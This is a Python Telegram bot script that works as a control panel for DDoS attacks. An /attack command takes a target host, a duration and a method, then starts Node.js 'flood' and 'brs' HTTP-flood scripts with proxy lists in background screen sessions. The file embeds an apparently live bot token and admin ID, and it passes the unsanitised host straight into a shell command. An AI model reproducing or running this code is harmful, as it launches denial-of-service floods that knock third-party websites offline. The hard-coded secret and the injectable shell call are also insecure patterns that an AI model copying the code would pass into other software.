import telebot
import os
import json
from datetime import datetime

TOKEN = '7693905411:AAEBqMOg8LJl2JYHSsbLcMrw-RxznlvRNzI'
ADMIN_IDS = [6033886040]
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['attack'])
def attack(message):
    if message.from_user.id not in ADMIN_IDS:
        return
    
    try:
        command_parts = message.text.split()
        if len(command_parts) != 4:
            bot.reply_to(message, 'Usage: /attack host time method.')
            return
        
        host = command_parts[1]
        time = command_parts[2]
        method = command_parts[3]

        if method == "https":
            os.system(f"screen -dm node flood {host} {time} 66 6 all.txt")
        elif method == "bypass":
            os.system(f"screen -dm node flood {host} {time} 64 5 vn.txt")
        elif method == "browser":
            os.system(f"screen -dm node brs {host} 7 all.txt 64 {time}")
        else:
            bot.reply_to(message, 'Available methods: bypass, https, browser.')
            return
        
        response = {
            "Messenger": "HenryNetWork",
            "Host": host,
            "Port": "443",
            "Time": time,
            "Method_use": method,
            "Attack_time": datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        }

        bot.reply_to(message, json.dumps(response, indent=4))

    except Exception as e:
        bot.reply_to(message, f"Server is down !")

bot.polling()